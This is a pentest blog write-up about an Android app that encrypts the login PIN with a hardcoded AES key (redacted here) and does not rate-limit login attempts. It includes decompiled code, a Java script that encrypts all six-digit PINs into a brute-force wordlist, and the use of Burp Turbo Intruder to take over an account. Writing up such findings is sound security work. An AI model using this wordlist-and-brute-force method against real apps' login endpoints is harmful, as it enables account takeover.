---
title: "Android App Pentesting - Hardcoded Encryption Key + No Rate Limiting Lead to Account Takeover"
date: 2020-9-10T20:15:13+07:00
categories:
  - blog
tags:
  - pentest
  - writeup
  - burpsuite
  - hardcoded-key
---

So while pentesting an Android application (lets just call it App A), I stumble upon an unlimited login attempt trial -- which was only consist of a phone number and a **six digit** PIN number.. 

At first I thought that this was a really "juicy" target to bruteforce, but that thought immediately disappear once I see the request. 

Request
![request](/assets/images/writeup-1/req.png)

The request is a JSON object consist of fcmToken, phoneNumber, and a pin number which is somehow looks absolutely different from what I sent from the login screen.

My first guess was that the pin parameter is encoded in Base 64 (notice the "==" at the end), but as I decoding it into plain text, it turns out to be gibberish bytes-like text.
```python
>>> import base64
>>> base64.b64decode("JTuPDh122ItijR3aw989lg==")
b'%;\x8f\x0e\x1dv\xd8\x8bb\x8d\x1d\xda\xc3\xdf=\x96'
```

My next step was to guess how the pin parameter is getting encrypted. Since the app wasn't obfuscated by either Proguard/Dexguard and I was able to decompile and gain a pretty clear view of the source code, I begin by inspecting the LoginActivity -- which of course responsible for handling the login activity.

```java
final String str2 = "0" + this.phoneNumber.getText().toString();
final String obj = this.pin.getText().toString();
LoginRequest loginRequest = new LoginRequest(str2, AES.AES256Encrypt(obj), str);
```


It turns out that the pin number is passed into AES256Encrypt method, and -- you guess it from the title -- the key is hardcoded into the method itself.
```java
    public static String AES256Encrypt(String str) {
        String str2;
        try {
            str2 = Base64.encodeToString(encrypt("<REDACTED>".getBytes("UTF-8"), "<REDACTED>".getBytes("UTF-8"), str.getBytes("UTF-8")), 0);
        } catch (Exception e) {
            PrintStream printStream = System.err;
            printStream.println("Encrypted Err: " + e.getMessage());
            str2 = e.getMessage();
        }
        return str2.replaceAll("\\n", "");
    }    return str2.replaceAll("\\n", "");
```
As you see, there are two  \<REDACTED> parameter in the code above, the first is Initialization Vector, and the other is Encryption/Secret Key itself.

Refering to the code above, I was able to make a script that encrypts the number in range of 100000-999999 to be then used as wordlist for bruteforcing. 

```java
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;
import java.io.PrintStream;
import javax.crypto.spec.IvParameterSpec;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import java.io.BufferedWriter;
import java.io.FileWriter;
    
public class Encrypt {
  public static byte[] encrypt(byte[] bArr, byte[] bArr2, byte[] bArr3) throws UnsupportedEncodingException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
      IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr);
      SecretKeySpec secretKeySpec = new SecretKeySpec(bArr2, "AES");
      Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
      instance.init(1, secretKeySpec, ivParameterSpec);
      return instance.doFinal(bArr3);
  }

  public static String AES256Encrypt(String str) {
      String str2;
    try {
        str2 = Base64.getEncoder().encodeToString(encrypt("<REDACTED>".getBytes("UTF-8"), "<REDACTED>".getBytes("UTF-8"), str.getBytes("UTF-8")));
    } catch (Exception e) {
        PrintStream printStream = System.err;
        printStream.println("Encrypted Err: " + e.getMessage());
        str2 = e.getMessage();
    }
    return str2.replaceAll("\\n", "");
  }

  public static void main(String args[]) {
    for (int i = 100000; i <= 999999; i++){
        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter("pin.txt", true));  
            writer.append(AES256Encrypt(String.valueOf(i)) + "\n");

            writer.close(); 
        } catch (Exception e){
            System.out.println(e);
        }
      } 
  }
}
```


Lastly, by using Burpsuite's Turbo Intruder and the wordlist generated from the script, I was able to gain access to my own account in relatively short amount of time :)

!(intruder)[/assets/images/writeup-1/intruder.png]

So remember whenever you find a parameter that doesn't look like what it is supposed to be, try to find and understand the logic behind it. If its encrypted or obfuscated, try to discover which part of the app is encrypting/obfuscating it, and in the case of encryption, there must be a key to encrypt it. 

For example, if the key is implemented over-the-air, you can obtain it by simply hooking the method using Frida, or if its hardcoded in the app, you can just refer to this post to decrypt it.

See ya :)